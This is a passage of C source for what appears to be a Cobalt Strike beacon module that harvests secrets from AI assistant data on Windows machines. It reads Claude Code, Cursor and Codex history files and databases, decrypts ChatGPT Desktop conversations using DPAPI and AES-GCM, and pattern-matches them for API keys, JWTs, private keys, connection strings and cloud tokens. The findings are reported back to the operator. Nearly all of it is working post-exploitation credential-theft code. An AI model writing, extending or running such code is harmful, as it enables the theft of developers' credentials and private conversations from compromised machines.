    if (t[p] != 'h' || t[p+1] != 'v') return 0;
    char x = t[p+2];
    if (x != 's' && x != 'b' && x != 'r') return 0;
    if (t[p+3] != '.') return 0;
    if (p > 0 && is_alnum(t[p-1])) return 0;
    int tail = 0;
    while (p + 4 + tail < tlen && is_alnum_ext(t[p + 4 + tail])) tail++;
    if (tail < 24) return 0;
    int total = 4 + tail;
    if (total >= vs) total = vs - 1;
    smemcpy(v, t + p, total); v[total] = '\0';
    return 1;
}

static int match_jwt(const char *t, int p, int tlen, char *v, int vs) {
    if (p + 10 >= tlen) return 0;
    if (t[p] != 'e' || t[p+1] != 'y' || t[p+2] != 'J') return 0;
    if (p > 0 && is_b64url(t[p-1])) return 0;
    int s = p + 3, dots = 0, seg_len = 3;
    while (s < tlen && dots < 3) {
        if (t[s] == '.') {
            if (seg_len < 3) return 0;
            dots++; seg_len = 0;
        } else if (is_b64url(t[s])) {
            seg_len++;
        } else {
            break;
        }
        s++;
    }
    if (dots != 2 || seg_len < 3) return 0;
    int total = s - p;
    if (total >= vs) total = vs - 1;
    smemcpy(v, t + p, total); v[total] = '\0';
    return 1;
}

static int match_pem(const char *t, int p, int tlen, char *v, int vs) {
    const char *pfx = "-----BEGIN ";
    int pfxlen = 11;
    if (p + pfxlen + 20 >= tlen) return 0;
    for (int i = 0; i < pfxlen; i++) {
        if (t[p + i] != pfx[i]) return 0;
    }
    int s = p + pfxlen;
    while (s < tlen && s < p + 50 && t[s] != '-') s++;
    const char *suffix = "PRIVATE KEY-----";
    int sfxlen = 16;
    int sk = s - sfxlen + 1;
    if (sk < p + pfxlen) return 0;
    for (int i = 0; i < sfxlen; i++) {
        if (t[sk + i] != suffix[i]) return 0;
    }
    int end = s;
    while (end < tlen && t[end] == '-') end++;
    int total = end - p;
    if (total >= vs) total = vs - 1;
    smemcpy(v, t + p, total); v[total] = '\0';
    return 1;
}

static int match_connstr(const char *t, int p, int tlen, char *v, int vs) {
    const char *protos[] = {"postgresql://", "mysql://", "mongodb://", "redis://", NULL};
    const int  plens[]   = {14, 8, 10, 8};
    for (int i = 0; protos[i]; i++) {
        int plen = plens[i];
        if (p + plen + 8 >= tlen) continue;
        int ok = 1;
        for (int j = 0; j < plen; j++) {
            if (t[p + j] != protos[i][j]) { ok = 0; break; }
        }
        if (!ok) continue;
        int tail = 0;
        while (p + plen + tail < tlen && is_nonspace(t[p + plen + tail])) tail++;
        if (tail < 8) continue;
        int total = plen + tail;
        if (total >= vs) total = vs - 1;
        smemcpy(v, t + p, total); v[total] = '\0';
        return 1;
    }
    return 0;
}

static int match_telegram(const char *t, int p, int tlen, char *v, int vs) {
    if (!is_digit(t[p])) return 0;
    if (p > 0 && is_alnum(t[p-1])) return 0;
    int digs = 0;
    while (p + digs < tlen && is_digit(t[p + digs])) digs++;
    if (digs < 8 || digs > 10) return 0;
    if (p + digs >= tlen || t[p + digs] != ':') return 0;
    int tail = 0;
    while (p + digs + 1 + tail < tlen && is_alnum_dash(t[p + digs + 1 + tail])) tail++;
    if (tail < 34) return 0;
    int total = digs + 1 + tail;
    if (total >= vs) total = vs - 1;
    smemcpy(v, t + p, total); v[total] = '\0';
    return 1;
}

static int match_gcp_sa(const char *t, int p, int tlen, char *v, int vs) {
    const char *suf = ".iam.gserviceaccount.com";
    int suflen = 23;
    if (p > 0 && (is_alnum(t[p-1]) || t[p-1] == '-')) return 0;
    if (!is_alnum(t[p])) return 0;
    int at = -1;
    for (int i = p; i < tlen && i < p + 200; i++) {
        if (t[i] == '@') { at = i; break; }
        if (!is_alnum_dash(t[i]) && t[i] != '.') break;
    }
    if (at < 0 || at - p < 3) return 0;
    int end = at + 1;
    while (end < tlen && (is_alnum_dash(t[end]) || t[end] == '.')) end++;
    int after_at_len = end - at - 1;
    if (after_at_len < suflen) return 0;
    int check_start = end - suflen;
    int ok = 1;
    for (int i = 0; i < suflen; i++) {
        if (to_lower(t[check_start + i]) != suf[i]) { ok = 0; break; }
    }
    if (!ok) return 0;
    int total = end - p;
    if (total >= vs) total = vs - 1;
    smemcpy(v, t + p, total); v[total] = '\0';
    return 1;
}

/* ----------------------------------------------------------------
 * Heuristic context-signal patterns (10 patterns)
 * ---------------------------------------------------------------- */

typedef struct {
    const char *name;
    const char *keywords[5];
    int min_val;
} hpat_t;

static const hpat_t HPATS[] = {
    {"heuristic_api_key",
     {"api_key=", "apikey=", "api-key=", "API_KEY=", NULL}, 8},
    {"heuristic_password",
     {"password=", "passwd=", "pwd=", "PASSWORD=", NULL}, 8},
    {"heuristic_secret_key",
     {"secret_key=", "secret-key=", "SECRET_KEY=", NULL, NULL}, 8},
    {"heuristic_token",
     {"access_token=", "auth_token=", "bearer=", "ACCESS_TOKEN=", NULL}, 8},
    {"heuristic_private_key",
     {"private_key=", "private-key=", "PRIVATE_KEY=", NULL, NULL}, 8},
    {"heuristic_aws_secret",
     {"AWS_SECRET_ACCESS_KEY=", "SecretAccessKey=", "aws_secret_access_key=", NULL, NULL}, 40},
    {"heuristic_jwt_secret",
     {"JWT_SECRET=", "jwt_secret=", "SIGNING_KEY=", "TOKEN_SECRET=", NULL}, 8},
    {"heuristic_azure_secret",
     {"AZURE_CLIENT_SECRET=", "client_secret=", "AZURE_STORAGE_KEY=", "AccountKey=", NULL}, 32},
    {"heuristic_generic_secret",
     {"api-secret=", "auth-key=", "private-token=", "api_secret=", NULL}, 32},
    {"heuristic_supabase_key",
     {"SUPABASE_SERVICE_ROLE_KEY=", "SUPABASE_ANON_KEY=", "supabase_key=", NULL, NULL}, 20},
    {NULL, {NULL}, 0}
};

static int try_heuristic(const char *text, int pos, int tlen,
                           const hpat_t *pat, char *val_out, int vsize) {
    for (int k = 0; pat->keywords[k]; k++) {
        int kwlen = slen(pat->keywords[k]);
        if (pos + kwlen >= tlen) continue;
        if (scmp_nocase(text + pos, pat->keywords[k], kwlen) != 0) continue;

        int vp = pos + kwlen;
        while (vp < tlen && (text[vp] == ' ' || text[vp] == '"' || text[vp] == '\''))
            vp++;

        int vlen = 0;
        while (vp + vlen < tlen && is_nonspace(text[vp + vlen]) &&
               text[vp + vlen] != '"' && text[vp + vlen] != '\'')
            vlen++;

        if (vlen < pat->min_val) continue;
        if (vlen >= vsize) vlen = vsize - 1;
        smemcpy(val_out, text + vp, vlen);
        val_out[vlen] = '\0';
        return 1;
    }
    return 0;
}

/* ----------------------------------------------------------------
 * Main scan function
 * ---------------------------------------------------------------- */

static const char* severity_for(const char *name, const char *confidence) {
    if (scmp(name, "aws_access_key") == 0 ||
        scmp(name, "anthropic_key") == 0 ||
        scmp(name, "openai_token") == 0 ||
        scmp(name, "github_pat_classic") == 0 ||
        scmp(name, "github_pat_fine") == 0 ||
        scmp(name, "github_app_token") == 0 ||
        scmp(name, "stripe_secret_key") == 0 ||
        scmp(name, "private_key_pem") == 0 ||
        scmp(name, "vault_token") == 0 ||
        scmp(name, "heuristic_aws_secret") == 0 ||
        scmp(name, "heuristic_supabase_key") == 0)
        return "critical";
    if (scmp(confidence, "high") == 0) return "high";
    return "medium";
}

static void emit_finding(const char *tool, const char *type, const char *value,
                           const char *file_path, const char *confidence,
                           int redact) {
    char esc_path[1024];
    json_escape(file_path, esc_path, sizeof(esc_path));

    char esc_val[512];
    if (redact && slen(value) > 8) {
        int vl = slen(value);
        char masked[512];
        int mp = 0;
        for (int i = 0; i < 4 && i < vl; i++) masked[mp++] = value[i];
        for (int i = 0; i < 8 && mp < 500; i++) masked[mp++] = '*';
        for (int i = vl - 4; i < vl && i >= 4; i++) masked[mp++] = value[i];
        masked[mp] = '\0';
        json_escape(masked, esc_val, sizeof(esc_val));
    } else {
        json_escape(value, esc_val, sizeof(esc_val));
    }

    const char *sev = severity_for(type, confidence);

    BeaconPrintf(CALLBACK_OUTPUT,
        "{\"tool\":\"%s\",\"type\":\"%s\",\"value\":\"%s\","
        "\"file\":\"%s\",\"severity\":\"%s\",\"confidence\":\"%s\"}\n",
        tool, type, esc_val, esc_path, sev, confidence);
}

static void scan_text(const char *text, int tlen, const char *tool,
                        const char *file_path, scan_ctx_t *ctx) {
    char val[512];

    for (int p = 0; p < tlen && ctx->findings < MAX_FINDINGS; p++) {
        /* Prefix patterns (high confidence) */
        for (int i = 0; PPATS[i].name; i++) {
            if (try_prefix_match(text, p, tlen, &PPATS[i], val, sizeof(val))) {
                if (!is_seen(val) && !is_placeholder(val, slen(val))) {
                    mark_seen(val);
                    emit_finding(tool, PPATS[i].name, val, file_path, "high", ctx->redact);
                    ctx->findings++;
                }
                break;
            }
        }

        /* Special structure patterns (high confidence) */
        const char *sname = NULL;
        int matched = 0;
        if (match_slack(text, p, tlen, val, sizeof(val)))
            { sname = "slack_token"; matched = 1; }
        else if (match_vault(text, p, tlen, val, sizeof(val)))
            { sname = "vault_token"; matched = 1; }
        else if (match_jwt(text, p, tlen, val, sizeof(val)))
            { sname = "jwt"; matched = 1; }
        else if (match_pem(text, p, tlen, val, sizeof(val)))
            { sname = "private_key_pem"; matched = 1; }
        else if (match_connstr(text, p, tlen, val, sizeof(val)))
            { sname = "connection_string"; matched = 1; }
        else if (match_telegram(text, p, tlen, val, sizeof(val)))
            { sname = "telegram_bot_token"; matched = 1; }
        else if (match_gcp_sa(text, p, tlen, val, sizeof(val)))
            { sname = "gcp_service_account"; matched = 1; }

        if (matched && !is_seen(val)) {
            mark_seen(val);
            if (!is_placeholder(val, slen(val))) {
                emit_finding(tool, sname, val, file_path, "high", ctx->redact);
                ctx->findings++;
            }
        }

        /* Heuristic patterns (medium confidence) */
        if (!ctx->high_only) {
            for (int i = 0; HPATS[i].name; i++) {
                if (try_heuristic(text, p, tlen, &HPATS[i], val, sizeof(val))) {
                    if (!is_seen(val) && !is_placeholder(val, slen(val))) {
                        mark_seen(val);
                        emit_finding(tool, HPATS[i].name, val, file_path,
                                     "medium", ctx->redact);
                        ctx->findings++;
                    }
                    break;
                }
            }
        }
    }
}

/* ================================================================
 * Scanner: Claude Code CLI
 * ================================================================ */

typedef struct {
    scan_ctx_t *ctx;
    char tool[16];
} file_scan_data_t;

static void scan_jsonl_content(const char *data, int dlen, const char *tool,
                                 const char *fpath, scan_ctx_t *ctx) {
    const char *p = data;
    const char *end = data + dlen;

    while (p < end && ctx->findings < MAX_FINDINGS) {
        const char *nl = p;
        while (nl < end && *nl != '\n') nl++;
        int llen = (int)(nl - p);
        if (llen < 10) { p = nl + 1; continue; }

        const char *type_val = jfind_key(p, llen, "type");
        if (!type_val) { p = nl + 1; continue; }
        int is_msg = jstr_eq(type_val, "user") || jstr_eq(type_val, "assistant");
        if (!is_msg) { p = nl + 1; continue; }

        const char *msg = jfind_key(p, llen, "message");
        if (!msg) { p = nl + 1; continue; }

        const char *content = jfind_key(msg, (int)(nl - msg), "content");
        if (!content) { p = nl + 1; continue; }

        if (*content == '"') {
            char cbuf[4096];
            int clen = jread_str(content, cbuf, sizeof(cbuf));
            if (clen > 0) scan_text(cbuf, clen, tool, fpath, ctx);
        } else if (*content == '[') {
            const char *tp = content;
            int rem = (int)(nl - tp);
            while (rem > 0) {
                const char *tv = jfind_key(tp, rem, "text");
                if (!tv) break;
                if (*tv == '"') {
                    char tbuf[4096];
                    int tl = jread_str(tv, tbuf, sizeof(tbuf));
                    if (tl > 0) scan_text(tbuf, tl, tool, fpath, ctx);
                }
                tp = tv + 1;
                rem = (int)(nl - tp);
            }
        }
        p = nl + 1;
    }
}

static void scan_json_strings(const char *data, int dlen, const char *tool,
                                const char *fpath, scan_ctx_t *ctx) {
    const char *p = data;
    int i = 0;
    while (i < dlen && ctx->findings < MAX_FINDINGS) {
        if (p[i] == '"') {
            i++;
            int start = i;
            while (i < dlen && p[i] != '"') {
                if (p[i] == '\\') i++;
                i++;
            }
            int slen_val = i - start;
            if (slen_val >= 8 && slen_val < 4096) {
                char buf[4096];
                int blen = 0;
                for (int j = start; j < i && blen < 4095; j++) {
                    if (p[j] == '\\' && j + 1 < i) {
                        j++;
                        switch (p[j]) {
                            case 'n': buf[blen++] = '\n'; break;
                            case 't': buf[blen++] = '\t'; break;
                            default: buf[blen++] = p[j]; break;
                        }
                    } else {
                        buf[blen++] = p[j];
                    }
                }
                buf[blen] = '\0';
                scan_text(buf, blen, tool, fpath, ctx);
            }
            i++;
        } else {
            i++;
        }
    }
}

static void cb_claude_jsonl(const wchar_t *path, WIN32_FIND_DATAW *fd, void *user) {
    file_scan_data_t *fsd = (file_scan_data_t*)user;
    if (!file_is_recent(&fd->ftLastWriteTime, fsd->ctx->cutoff_ft)) return;

    DWORD sz = 0;
    unsigned char *data = read_file_w(path, MAX_FILE_SIZE, &sz);
    if (!data) return;
    fsd->ctx->files_scanned++;

    char fpath[MAX_FPATH];
    n_from_wide(path, fpath, sizeof(fpath));
    scan_jsonl_content((char*)data, (int)sz, fsd->tool, fpath, fsd->ctx);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, data);
}

static void cb_claude_json(const wchar_t *path, WIN32_FIND_DATAW *fd, void *user) {
    file_scan_data_t *fsd = (file_scan_data_t*)user;
    if (!file_is_recent(&fd->ftLastWriteTime, fsd->ctx->cutoff_ft)) return;

    DWORD sz = 0;
    unsigned char *data = read_file_w(path, MAX_FILE_SIZE, &sz);
    if (!data) return;
    fsd->ctx->files_scanned++;

    char fpath[MAX_FPATH];
    n_from_wide(path, fpath, sizeof(fpath));
    scan_json_strings((char*)data, (int)sz, fsd->tool, fpath, fsd->ctx);
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, data);
}

static void scan_claude_code(scan_ctx_t *ctx) {
    wchar_t base[MAX_FPATH];
    DWORD r = KERNEL32$GetEnvironmentVariableW(L"USERPROFILE", base, MAX_FPATH);
    if (r == 0) return;

    wchar_t claude_dir[MAX_FPATH];
    int pos = 0;
    wcat(claude_dir, MAX_FPATH, base, &pos);
    wcat(claude_dir, MAX_FPATH, L"\\.claude", &pos);
    if (!dir_exists(claude_dir)) return;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning Claude Code CLI...\n");

    file_scan_data_t fsd;
    fsd.ctx = ctx;
    scpy(fsd.tool, sizeof(fsd.tool), "claude_code");

    wchar_t proj_dir[MAX_FPATH];
    pos = 0;
    wcat(proj_dir, MAX_FPATH, claude_dir, &pos);
    wcat(proj_dir, MAX_FPATH, L"\\projects", &pos);
    int cnt = 0;
    walk_files(proj_dir, L"*.jsonl", 1, cb_claude_jsonl, &fsd, &cnt, MAX_FILES_TOOL);

    wchar_t task_dir[MAX_FPATH];
    pos = 0;
    wcat(task_dir, MAX_FPATH, claude_dir, &pos);
    wcat(task_dir, MAX_FPATH, L"\\tasks", &pos);
    cnt = 0;
    walk_files(task_dir, L"*.json", 1, cb_claude_json, &fsd, &cnt, MAX_FILES_TOOL);

    wchar_t hist[MAX_FPATH];
    pos = 0;
    wcat(hist, MAX_FPATH, claude_dir, &pos);
    wcat(hist, MAX_FPATH, L"\\history.jsonl", &pos);
    if (KERNEL32$GetFileAttributesW(hist) != INVALID_FILE_ATTRIBUTES) {
        DWORD sz = 0;
        unsigned char *data = read_file_w(hist, MAX_FILE_SIZE, &sz);
        if (data) {
            ctx->files_scanned++;
            char hpath[MAX_FPATH];
            n_from_wide(hist, hpath, sizeof(hpath));
            const char *p = (char*)data;
            const char *end = p + sz;
            while (p < end) {
                const char *nl = p;
                while (nl < end && *nl != '\n') nl++;
                int llen = (int)(nl - p);
                if (llen > 4) {
                    const char *dv = jfind_key(p, llen, "display");
                    if (dv && *dv == '"') {
                        char dbuf[2048];
                        int dl = jread_str(dv, dbuf, sizeof(dbuf));
                        if (dl > 4 && dbuf[0] != '/')
                            scan_text(dbuf, dl, "claude_code", hpath, ctx);
                    }
                }
                p = nl + 1;
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, data);
        }
    }
}

/* ================================================================
 * Scanner: Cursor IDE
 * ================================================================ */

static void scan_cursor_db(const wchar_t *db_path, scan_ctx_t *ctx) {
    wchar_t tmp[MAX_FPATH];
    if (!copy_to_temp(db_path, tmp)) return;

    char tmp_n[MAX_FPATH];
    n_from_wide(tmp, tmp_n, sizeof(tmp_n));

    sqlite3 *db = NULL;
    if (g_sq.open_v2(tmp_n, &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, NULL) != SQLITE_OK) {
        KERNEL32$DeleteFileW(tmp);
        return;
    }

    char db_path_n[MAX_FPATH];
    n_from_wide(db_path, db_path_n, sizeof(db_path_n));
    ctx->files_scanned++;

    sqlite3_stmt *stmt = NULL;
    const char *sql = "SELECT key, value FROM cursorDiskKV WHERE key LIKE 'composerData:%'";
    if (g_sq.prepare_v2(db, sql, -1, &stmt, NULL) != SQLITE_OK) {
        g_sq.close(db);
        KERNEL32$DeleteFileW(tmp);
        return;
    }

    while (g_sq.step(stmt) == SQLITE_ROW) {
        const char *val = (const char*)g_sq.column_text(stmt, 1);
        if (!val) continue;
        int vlen = slen(val);
        if (vlen < 10) continue;

        const char *tv = jfind_key(val, vlen, "text");
        if (tv && *tv == '"') {
            char tbuf[4096];
            int tl = jread_str(tv, tbuf, sizeof(tbuf));
            if (tl > 0) scan_text(tbuf, tl, "cursor", db_path_n, ctx);
        }

        const char *cm = jfind_key(val, vlen, "conversationMap");
        if (cm) {
            int rem = vlen - (int)(cm - val);
            const char *tp = cm;
            while (rem > 0) {
                const char *mtv = jfind_key(tp, rem, "text");
                if (!mtv) break;
                if (*mtv == '"') {
                    char mbuf[4096];
                    int ml = jread_str(mtv, mbuf, sizeof(mbuf));
                    if (ml > 0) scan_text(mbuf, ml, "cursor", db_path_n, ctx);
                }
                tp = mtv + 1;
                rem = vlen - (int)(tp - val);
            }
        }
    }

    g_sq.finalize(stmt);
    g_sq.close(db);
    KERNEL32$DeleteFileW(tmp);
}

static void scan_cursor(scan_ctx_t *ctx) {
    wchar_t appdata[MAX_FPATH];
    if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appdata, MAX_FPATH) == 0) return;

    wchar_t global_db[MAX_FPATH];
    int pos = 0;
    wcat(global_db, MAX_FPATH, appdata, &pos);
    wcat(global_db, MAX_FPATH, L"\\Cursor\\User\\globalStorage\\state.vscdb", &pos);

    if (KERNEL32$GetFileAttributesW(global_db) == INVALID_FILE_ATTRIBUTES) return;

    if (!sqlite_load()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] winsqlite3.dll not available\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning Cursor IDE...\n");
    scan_cursor_db(global_db, ctx);

    wchar_t ws_root[MAX_FPATH];
    pos = 0;
    wcat(ws_root, MAX_FPATH, appdata, &pos);
    wcat(ws_root, MAX_FPATH, L"\\Cursor\\User\\workspaceStorage", &pos);

    if (dir_exists(ws_root)) {
        int cnt = 0;
        WIN32_FIND_DATAW fd;
        wchar_t search[MAX_FPATH];
        pos = 0;
        wcat(search, MAX_FPATH, ws_root, &pos);
        wcat(search, MAX_FPATH, L"\\*", &pos);

        HANDLE hf = KERNEL32$FindFirstFileW(search, &fd);
        if (hf != INVALID_HANDLE_VALUE) {
            do {
                if (cnt >= 20) break;
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
                if (fd.cFileName[0] == L'.') continue;

                wchar_t ws_db[MAX_FPATH];
                pos = 0;
                wcat(ws_db, MAX_FPATH, ws_root, &pos);
                wcat(ws_db, MAX_FPATH, L"\\", &pos);
                wcat(ws_db, MAX_FPATH, fd.cFileName, &pos);
                wcat(ws_db, MAX_FPATH, L"\\state.vscdb", &pos);

                if (KERNEL32$GetFileAttributesW(ws_db) != INVALID_FILE_ATTRIBUTES) {
                    scan_cursor_db(ws_db, ctx);
                    cnt++;
                }
            } while (KERNEL32$FindNextFileW(hf, &fd));
            KERNEL32$FindClose(hf);
        }
    }
}

/* ================================================================
 * Scanner: Codex CLI
 * ================================================================ */

static void scan_codex(scan_ctx_t *ctx) {
    wchar_t home[MAX_FPATH];
    if (KERNEL32$GetEnvironmentVariableW(L"USERPROFILE", home, MAX_FPATH) == 0) return;

    wchar_t state_db[MAX_FPATH];
    int pos = 0;
    wcat(state_db, MAX_FPATH, home, &pos);
    wcat(state_db, MAX_FPATH, L"\\.codex\\state_5.sqlite", &pos);

    if (KERNEL32$GetFileAttributesW(state_db) == INVALID_FILE_ATTRIBUTES) return;
    if (!sqlite_load()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] winsqlite3.dll not available\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning Codex CLI...\n");

    wchar_t tmp[MAX_FPATH];
    if (!copy_to_temp(state_db, tmp)) return;

    char tmp_n[MAX_FPATH];
    n_from_wide(tmp, tmp_n, sizeof(tmp_n));
    char db_path_n[MAX_FPATH];
    n_from_wide(state_db, db_path_n, sizeof(db_path_n));

    sqlite3 *db = NULL;
    if (g_sq.open_v2(tmp_n, &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, NULL) != SQLITE_OK) {
        KERNEL32$DeleteFileW(tmp);
        return;
    }
    ctx->files_scanned++;

    sqlite3_stmt *stmt = NULL;
    if (g_sq.prepare_v2(db, "SELECT id, first_user_message FROM threads", -1, &stmt, NULL) == SQLITE_OK) {
        while (g_sq.step(stmt) == SQLITE_ROW) {
            const char *msg = (const char*)g_sq.column_text(stmt, 1);
            if (msg && slen(msg) > 4)
                scan_text(msg, slen(msg), "codex", db_path_n, ctx);
        }
        g_sq.finalize(stmt);
    }
    g_sq.close(db);
    KERNEL32$DeleteFileW(tmp);

    wchar_t logs_db[MAX_FPATH];
    pos = 0;
    wcat(logs_db, MAX_FPATH, home, &pos);
    wcat(logs_db, MAX_FPATH, L"\\.codex\\logs_2.sqlite", &pos);

    if (KERNEL32$GetFileAttributesW(logs_db) != INVALID_FILE_ATTRIBUTES) {
        if (!copy_to_temp(logs_db, tmp)) return;
        n_from_wide(tmp, tmp_n, sizeof(tmp_n));

        if (g_sq.open_v2(tmp_n, &db, SQLITE_OPEN_READONLY | SQLITE_OPEN_NOMUTEX, NULL) == SQLITE_OK) {
            ctx->files_scanned++;
            if (g_sq.prepare_v2(db, "SELECT feedback_log_body FROM logs WHERE feedback_log_body IS NOT NULL",
                                 -1, &stmt, NULL) == SQLITE_OK) {
                while (g_sq.step(stmt) == SQLITE_ROW) {
                    const char *body = (const char*)g_sq.column_text(stmt, 0);
                    if (body && slen(body) > 4) {
                        char logs_path_n[MAX_FPATH];
                        n_from_wide(logs_db, logs_path_n, sizeof(logs_path_n));
                        scan_text(body, slen(body), "codex", logs_path_n, ctx);
                    }
                }
                g_sq.finalize(stmt);
            }
            g_sq.close(db);
        }
        KERNEL32$DeleteFileW(tmp);
    }
}

/* ================================================================
 * Scanner: ChatGPT Desktop
 * ================================================================ */

static void scan_chatgpt(scan_ctx_t *ctx) {
    wchar_t localappdata[MAX_FPATH];
    if (KERNEL32$GetEnvironmentVariableW(L"LOCALAPPDATA", localappdata, MAX_FPATH) == 0) return;

    wchar_t base[MAX_FPATH];
    int pos = 0;
    wcat(base, MAX_FPATH, localappdata, &pos);
    wcat(base, MAX_FPATH, L"\\com.openai.chat", &pos);

    if (!dir_exists(base)) {
        wchar_t appdata[MAX_FPATH];
        if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appdata, MAX_FPATH) == 0) return;
        pos = 0;
        wcat(base, MAX_FPATH, appdata, &pos);
        wcat(base, MAX_FPATH, L"\\com.openai.chat", &pos);
        if (!dir_exists(base)) return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning ChatGPT Desktop...\n");

    wchar_t ls_path[MAX_FPATH];
    pos = 0;
    wcat(ls_path, MAX_FPATH, base, &pos);
    wcat(ls_path, MAX_FPATH, L"\\Local State", &pos);

    unsigned char *master_key = NULL;
    DWORD key_len = 0;
    DWORD ls_sz = 0;
    unsigned char *ls_data = read_file_w(ls_path, 512 * 1024, &ls_sz);
    if (ls_data && ls_sz > 0) {
        master_key = dpapi_decrypt_key((char*)ls_data, (int)ls_sz, &key_len);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ls_data);
    }

    WIN32_FIND_DATAW fd;
    wchar_t search[MAX_FPATH];
    pos = 0;
    wcat(search, MAX_FPATH, base, &pos);
    wcat(search, MAX_FPATH, L"\\conversations-v3-*", &pos);

    HANDLE hDir = KERNEL32$FindFirstFileW(search, &fd);
    if (hDir == INVALID_HANDLE_VALUE) goto chatgpt_done;

    int file_cnt = 0;
    do {
        if (file_cnt >= MAX_FILES_TOOL) break;
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (fd.cFileName[0] == L'.') continue;

        wchar_t conv_dir[MAX_FPATH];
        pos = 0;
        wcat(conv_dir, MAX_FPATH, base, &pos);
        wcat(conv_dir, MAX_FPATH, L"\\", &pos);
        wcat(conv_dir, MAX_FPATH, fd.cFileName, &pos);

        wchar_t data_search[MAX_FPATH];
        pos = 0;
        wcat(data_search, MAX_FPATH, conv_dir, &pos);
        wcat(data_search, MAX_FPATH, L"\\*.data", &pos);

        WIN32_FIND_DATAW dfd;
        HANDLE hData = KERNEL32$FindFirstFileW(data_search, &dfd);
        if (hData == INVALID_HANDLE_VALUE) continue;

        do {
            if (file_cnt >= MAX_FILES_TOOL) break;
            if (dfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            if (!file_is_recent(&dfd.ftLastWriteTime, ctx->cutoff_ft)) continue;

            wchar_t data_path[MAX_FPATH];
            pos = 0;
            wcat(data_path, MAX_FPATH, conv_dir, &pos);
            wcat(data_path, MAX_FPATH, L"\\", &pos);
            wcat(data_path, MAX_FPATH, dfd.cFileName, &pos);

            DWORD dsz = 0;
            unsigned char *raw = read_file_w(data_path, MAX_FILE_SIZE, &dsz);
            if (!raw || dsz < 4) { if (raw) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, raw); continue; }

            ctx->files_scanned++;
            file_cnt++;

            char fpath_n[MAX_FPATH];
            n_from_wide(data_path, fpath_n, sizeof(fpath_n));
            HANDLE heap = KERNEL32$GetProcessHeap();

            if (master_key && dsz > 3 + GCM_NONCE_LEN + GCM_TAG_LEN &&
                raw[0] == 'v' && raw[1] == '1') {
                int pt_len = 0;
                unsigned char *pt = gcm_decrypt(master_key, key_len, raw, (int)dsz, &pt_len);
                KERNEL32$HeapFree(heap, 0, raw);
                if (pt && pt_len > 0) {
                    const char *mp = jfind_key((char*)pt, pt_len, "mapping");
                    if (mp) {
                        int rem = pt_len - (int)(mp - (char*)pt);
                        const char *tp = mp;
                        while (rem > 0) {
                            const char *parts = jfind_key(tp, rem, "parts");
                            if (!parts) break;
                            int scan_rem = rem - (int)(parts - tp);
                            if (scan_rem > 4096) scan_rem = 4096;
                            scan_text(parts, scan_rem, "chatgpt", fpath_n, ctx);
                            tp = parts + 1;
                            rem = pt_len - (int)(tp - (char*)pt);
                        }
                    } else {
                        scan_text((char*)pt, pt_len, "chatgpt", fpath_n, ctx);
                    }
                    KERNEL32$RtlZeroMemory(pt, pt_len);
                    KERNEL32$HeapFree(heap, 0, pt);
                }
            } else {
                DATA_BLOB in_b, out_b;
                in_b.cbData = dsz;
                in_b.pbData = raw;
                out_b.cbData = 0;
                out_b.pbData = NULL;
                if (CRYPT32$CryptUnprotectData(&in_b, NULL, NULL, NULL, NULL, 0, &out_b) &&
                    out_b.pbData && out_b.cbData > 0) {
                    scan_text((char*)out_b.pbData, (int)out_b.cbData, "chatgpt", fpath_n, ctx);
                    KERNEL32$RtlZeroMemory(out_b.pbData, out_b.cbData);
                    KERNEL32$LocalFree(out_b.pbData);
                } else {
                    scan_text((char*)raw, (int)dsz, "chatgpt", fpath_n, ctx);
                }
                KERNEL32$HeapFree(heap, 0, raw);
            }
        } while (KERNEL32$FindNextFileW(hData, &dfd));
        KERNEL32$FindClose(hData);
    } while (KERNEL32$FindNextFileW(hDir, &fd));
    KERNEL32$FindClose(hDir);

chatgpt_done:
    if (master_key) {
        KERNEL32$RtlZeroMemory(master_key, key_len);
        KERNEL32$LocalFree(master_key);
    }
}

/* ================================================================
 * Scanner: Claude Desktop (stub)
 * ================================================================ */

static int claude_desktop_available(void) {
    wchar_t appdata[MAX_FPATH];
    if (KERNEL32$GetEnvironmentVariableW(L"APPDATA", appdata, MAX_FPATH) == 0) return 0;
    wchar_t path[MAX_FPATH];
    int pos = 0;
    wcat(path, MAX_FPATH, appdata, &pos);
    wcat(path, MAX_FPATH, L"\\Claude", &pos);
    return dir_exists(path);
}

/* ================================================================
 * List Available Tools
 * ================================================================ */

static void list_tools(void) {
    wchar_t home[MAX_FPATH], appdata[MAX_FPATH], localappdata[MAX_FPATH];
    KERNEL32$GetEnvironmentVariableW(L"USERPROFILE", home, MAX_FPATH);
    KERNEL32$GetEnvironmentVariableW(L"APPDATA", appdata, MAX_FPATH);
    KERNEL32$GetEnvironmentVariableW(L"LOCALAPPDATA", localappdata, MAX_FPATH);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Detected AI tools:\n");

    wchar_t p[MAX_FPATH];
    int pos = 0;
    wcat(p, MAX_FPATH, home, &pos);
    wcat(p, MAX_FPATH, L"\\.claude", &pos);
    BeaconPrintf(CALLBACK_OUTPUT, "  Claude Code CLI: %s\n",
                  dir_exists(p) ? "FOUND" : "not found");

    pos = 0;
    wcat(p, MAX_FPATH, appdata, &pos);
    wcat(p, MAX_FPATH, L"\\Cursor\\User\\globalStorage", &pos);
    BeaconPrintf(CALLBACK_OUTPUT, "  Cursor IDE:      %s\n",
                  dir_exists(p) ? "FOUND" : "not found");

    pos = 0;
    wcat(p, MAX_FPATH, home, &pos);
